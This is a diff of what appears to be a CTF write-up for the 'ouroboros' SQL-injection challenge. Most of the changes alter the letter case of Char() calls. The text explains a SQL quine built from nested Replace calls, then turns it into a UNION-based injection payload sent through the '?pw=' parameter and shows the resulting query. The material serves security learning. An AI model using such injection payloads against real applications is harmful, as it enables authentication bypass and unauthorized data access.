@@ -54,21 +54,21 @@ AS Quine
 ### Initial string
 
 ```sql
-'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine'
+'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine'
 ```
 ### First replacement
 
 ```sql
 -- - SELECT Replace( -- -
 Replace( 
-'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine', 
+'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine', 
 Char(34), 
 Char(39)
 )
--- - , Char(36), 'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine -- -
+-- - , Char(36), 'SELECT REPLACE(REPLACE("$",Char(34),Char(39)),Char(36),"$") AS Quine') AS Quine -- -
 ```
 
-Replace all occurrences of `CHAR(34)` (double quote `"` character) with `CHAR(39)` (single quote `'` character):
+Replace all occurrences of `Char(34)` (double quote `"` Character) with `Char(39)` (single quote `'` Character):
 
 ```sql
 -- - SELECT Replace( -- -
@@ -87,14 +87,14 @@ Char(36),
 -- - AS Quine -- -
 ```
 
-Replace all occurrences of `CHAR(36)` (dollar sign `$` character) with the original string:
+Replace all occurrences of `Char(36)` (dollar sign `$` Character) with the original string:
 
 ```sql
 -- - SELECT -- -
 'SELECT Replace(Replace(
-\'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine\',
-CHAR(34),CHAR(39)),CHAR(36),
-\'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine\')
+\'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine\',
+Char(34),Char(39)),Char(36),
+\'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine\')
 AS Quine'
 -- - AS Quine -- -
 ```
@@ -105,9 +105,9 @@ The final result of the query is the string after both replacements, as follows:
 ```sql
 SELECT
 'SELECT Replace(Replace(
-\'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine\',
-CHAR(34), CHAR(39)), CHAR(36),
-\'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine\')
+\'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine\',
+Char(34), Char(39)), Char(36),
+\'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine\')
 AS Quine'
 AS Quine
 ```
@@ -116,9 +116,9 @@ When this SQL query is executed, it will produce a single column named `Quine` c
 
 ```sql
 SELECT Replace(Replace(
-'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',
-CHAR(34), CHAR(39)), CHAR(36),
-'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine')
+'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine',
+Char(34), Char(39)), Char(36),
+'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine')
 AS Quine
 ```
 
@@ -130,19 +130,19 @@ Now, we have to implement this for the challenge.
 We will have to modify this Quine to the following:
 
 ```sql
-UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -
+UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -',Char(34),Char( 39)),Char(36),'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -') -- -
 ```
 
 If we provide the following URI parameter:
 
 ```
-?pw=' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -
+?pw=' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -',Char(34),Char( 39)),Char(36),'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -') -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT pw FROM prob_ouroboros WHERE pw='' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -'
+SELECT pw FROM prob_ouroboros WHERE pw='' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -',Char(34),Char( 39)),Char(36),'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -') -- -'
 ```
 
 ![4](https://github.com/Kunull/Write-ups/assets/110326359/2022ca1c-e568-4989-aa51-186eaacd6810)
